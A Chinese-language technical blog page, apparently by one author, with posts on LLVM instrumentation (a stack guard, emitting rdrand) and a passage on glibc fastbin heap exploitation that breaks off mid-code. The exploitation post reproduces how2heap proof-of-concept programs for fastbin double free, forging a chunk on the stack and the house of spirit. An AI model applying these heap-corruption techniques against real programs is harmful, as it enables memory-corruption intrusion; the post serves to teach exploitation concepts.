<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Address为257表示在用户模式下的fs段寄存器</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> Constant* <span class="title">SegmentOffsetStack</span><span class="params">(IRBuilder&lt;&gt; &amp;IRB, <span class="keyword">unsigned</span> Offset, <span class="keyword">unsigned</span> AddressSpace)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ConstantExpr::getIntToPtr(</span><br><span class="line">		ConstantInt::get(Type::getInt32Ty(IRB.getContext()), Offset),</span><br><span class="line">		Type::getInt8PtrTy(IRB.getContext())-&gt;getPointerTo(AddressSpace)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> Value* <span class="title">getTheStackGuardValue</span><span class="params">(IRBuilder&lt;&gt; &amp;IRB, <span class="keyword">unsigned</span> offset)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> SegmentOffsetStack(IRB, offset, <span class="number">257</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中offset为从fs段偏移offset处取数据。</p>
<p>下附我对stack guard的一个简单的实现:<br><a href="https://github.com/bin2415/llvm-stack-guard" target="_blank" rel="noopener">stackguard</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/11/18/llvm-rdrand/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/11/18/llvm-rdrand/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">llvm生成rdrand指令</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-11-18 09:27:03" itemprop="dateCreated datePublished" datetime="2017-11-18T09:27:03+08:00">2017-11-18</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/llvm/" itemprop="url" rel="index"><span itemprop="name">llvm</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在做一个project的时候需要使用llvm的pass对函数进行插桩，在每一个函数头之前插入一条指令rdrand %rax，在寻找llvm基本指令之后发现并没有生成随机数的指令，这时就想到了llvm中intrinsic函数中是否有关于rdrand指令的函数，在对llvm整个源码进行扫描之后，发现有x86的rdrand的intrinsic函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">X86_INTRINSIC_DATA(rdrand_16, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br><span class="line">X86_INTRINSIC_DATA(rdrand_32, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br><span class="line">X86_INTRINSIC_DATA(rdrand_64, RDRAND, X86ISD::RDRAND, <span class="number">0</span>),</span><br></pre></td></tr></table></figure>
<p>既然有对它们的定义，那是否有关于它们的使用呢，又经过一番查找，终于在一个测试文件中(/test/CodeGen/X86/rdrand.ll)找到相应的使用:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">declare &#123;i16, i32&#125; @llvm.x86.rdrand<span class="number">.16</span>()</span><br><span class="line">declare &#123;i32, i32&#125; @llvm.x86.rdrand<span class="number">.32</span>()</span><br><span class="line">declare &#123;i64, i32&#125; @llvm.x86.rdrand<span class="number">.64</span>()</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand16_step(i16* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i16, i32&#125; @llvm.x86.rdrand<span class="number">.16</span>()</span><br><span class="line">  %randval = extractvalue &#123;i16, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i16 %randval, i16* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i16, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand16_step:</span><br><span class="line">; CHECK: rdrandw	%ax</span><br><span class="line">; CHECK: movzwl	%ax, %ecx</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%ecx, %eax</span><br><span class="line">; CHECK: movw	%cx, (%r[[A0:di|cx]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand32_step(i32* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i32, i32&#125; @llvm.x86.rdrand<span class="number">.32</span>()</span><br><span class="line">  %randval = extractvalue &#123;i32, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i32 %randval, i32* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i32, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand32_step:</span><br><span class="line">; CHECK: rdrandl	%e[[T0:[a-z]+]]</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%e[[T0]], %eax</span><br><span class="line">; CHECK: movl	%e[[T0]], (%r[[A0]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define i32 @_rdrand64_step(i64* %random_val) &#123;</span><br><span class="line">  %call = call &#123;i64, i32&#125; @llvm.x86.rdrand<span class="number">.64</span>()</span><br><span class="line">  %randval = extractvalue &#123;i64, i32&#125; %call, <span class="number">0</span></span><br><span class="line">  store i64 %randval, i64* %random_val</span><br><span class="line">  %isvalid = extractvalue &#123;i64, i32&#125; %call, <span class="number">1</span></span><br><span class="line">  ret i32 %isvalid</span><br><span class="line">; CHECK-LABEL: _rdrand64_step:</span><br><span class="line">; CHECK: rdrandq	%r[[T1:[a-z]+]]</span><br><span class="line">; CHECK: movl	$<span class="number">1</span>, %eax</span><br><span class="line">; CHECK: cmovael	%e[[T1]], %eax</span><br><span class="line">; CHECK: movq	%r[[T1]], (%r[[A0]])</span><br><span class="line">; CHECK: ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个系列函数是对rdrandx_step(address)系列函数的包装，在这些函数中是生成随机数，并将该随机数保存到address参数中。发现在该系列函数中对@llvm.x86.rdrand.xx()系列函数的调用，可以发现，在该函数第一个语句是对@llvm.x86.rdrand.xx() intrinsic函数的调用，该函数返回一个StructType类型的结果，该结果一共有两个成员组成，第一个成员是@llvm.x86.rdrand.xx()函数产生的随机数，第二个参数表示该函数是否调用成功。第二个语句就是从结果中取出随机数。弄清了该函数的逻辑后就可以通过llvm C API产生相应的IR指令。</p>
<h2 id="llvm-C-API"><a href="#llvm-C-API" class="headerlink" title="llvm C API"></a>llvm C API</h2><p>下面是我通过llvm的C API产生的相应的IR指令的代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AllocaInst* AI3 = B.CreateAlloca(PtrTy, <span class="literal">nullptr</span>, <span class="string">"RandomValue"</span>);</span><br><span class="line">	</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Type *&gt; arg_type;</span><br><span class="line">	</span><br><span class="line">Function *fun = Intrinsic::getDeclaration(F-&gt;getParent(), Intrinsic::x86_rdrand_64, arg_type);</span><br><span class="line">CallInst* result = B.CreateCall(fun, &#123;&#125;);</span><br><span class="line">	<span class="comment">//B.CreateRet(result);</span></span><br><span class="line">	<span class="comment">//result-&gt;dump();</span></span><br><span class="line"><span class="keyword">if</span> (dyn_cast&lt;StructType&gt;(result-&gt;getType())) &#123;</span><br><span class="line">		<span class="comment">//errs() &lt;&lt; "Hello\n";</span></span><br><span class="line">	Value* randomValue = B.CreateExtractValue(result, (<span class="keyword">uint64_t</span>)<span class="number">0</span>);</span><br><span class="line">	Value* randomValuePtr = B.CreateIntToPtr(randomValue, Type::getInt8PtrTy(B.getContext()));</span><br><span class="line">	B.CreateStore(randomValuePtr, AI3, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在生成了.ll文件后，需要用llc工具生成二进制文件，此时需要添加-mattr=rdrnd的属性:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc -filetype=obj input.ll -mattr=+rdrnd -o output.o</span><br></pre></td></tr></table></figure>
<p>否则会出现LLVM ERROR: Cannot select: t74: i64,i32,ch = X86ISD::RDRAND t0错误</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/09/24/linux堆内存漏洞利用之fastbin/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">linux堆内存漏洞利用之fastbin</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-09-24 10:14:15" itemprop="dateCreated datePublished" datetime="2017-09-24T10:14:15+08:00">2017-09-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/ptmalloc/" itemprop="url" rel="index"><span itemprop="name">ptmalloc</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>  在<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:</p>
<ul>
<li>fastbin的攻击</li>
<li>smallbin的攻击</li>
<li>largebin的攻击</li>
<li>unsorted bin的攻击</li>
<li><p>top chunk的攻击</p>
<p>本文主要介绍fastbin的攻击</p>
</li>
</ul>
<h2 id="fastbin漏洞利用"><a href="#fastbin漏洞利用" class="headerlink" title="fastbin漏洞利用"></a>fastbin漏洞利用</h2><p>  具体的fastbin的介绍请参考<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>和 <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="noopener">Linux堆内存管理深入分析(下)</a>，在本节中主要结合<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>的代码来介绍一下具体的漏洞利用思路。</p>
<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p>  double free的意思就是一个malloc的指针被释放了两次，由于针对fastbin的free处理只是对double free做了简单的判断，所以很容易绕过它的double free判断。free() fastbin时的判断如下所示：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>  其中old指针为fast bin的头指针，即此处只是判断fastbin的头指针和p指针是否一致。所以fastbin double free的攻击思路就是我们只要保证要double free的chunk不在fastbin的头部即可。</p>
<p>  具体的攻击示例如下：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  在此示例中，首先申请三个大小为8的int数组，然后先free(a),由于fast bin是一个单链表，在插入和删除的时候只在头部进行，所以此时将a的chunk放入了fast bin的头部，随后又free(b),此时fast bin的头部为chunk b，随后又free(a)，此时由于fast bin的头部为chunk b，所以在free()的时候进行判断old == p不会抛出错误进而绕过这个简单的判断处理。再进行malloc的时候首先会从fast bin的头部进行删除，则接下来第一个分配的chunk为chunk A，第二个分配的为chunk B，接下来会再次分配chunk A。</p>
<p>  绕过示例结果如下所示:</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png" alt="fast bin dup"></p>
<h3 id="fast-bin-double-free-in-stack"><a href="#fast-bin-double-free-in-stack" class="headerlink" title="fast bin double free in stack"></a>fast bin double free in stack</h3><p>  上面的那个例子只是简单的一个double free，这个例子是利用double free漏洞在栈中构造了一个fake chunk。<br>  其具体的示例如下所示:</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  在以上代码中，当d被malloc的时候，此时还有对应的chunk a在fast bin中，所以如果对d进行修改，也会影响到chunk a的值。我们知道malloced chunk和freed chunk对应的结构不一样，对与同一个chunk A来说，有两种形式–对于d来说，其对应的是malloced chunk，而其在fast bin中还有一个freed chunk。<br>  其示例如图所示：</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png" alt="fast bin stack pin"></p>
<p>  可以看到<em>d(payload开始地址)正好对应了chunk A的fd指针，将 </em>d的值赋值为&amp;stack_var-8,则 stack_var=0x20即为在栈中伪造的chunk的size=0x20，与此fast bin的大小对应，此时chunk A的fd指向了在栈中伪造的chunk，此时就将伪造的chunk放入了fastbin链表中。进而malloc可以返回伪造的指针。</p>
<p>  该示例代码的运行结果如下所示：</p>
<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png" alt="fast bin stack"></p>
<h3 id="The-house-of-spirit"><a href="#The-house-of-spirit" class="headerlink" title="The house of spirit"></a>The house of spirit</h3><p>  此攻击也是在栈中伪造fake chunk，和第二个攻击不同的是其只是在栈中声明了一个指针，而并没有通过malloc()函数来在堆中申请空间，接着将该指针赋值为特定的伪造的chunk的地址，随后free该指针，就将在栈中伪造的chunk添加到对应的fastbin中去了。具体的示例如下所示:</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span 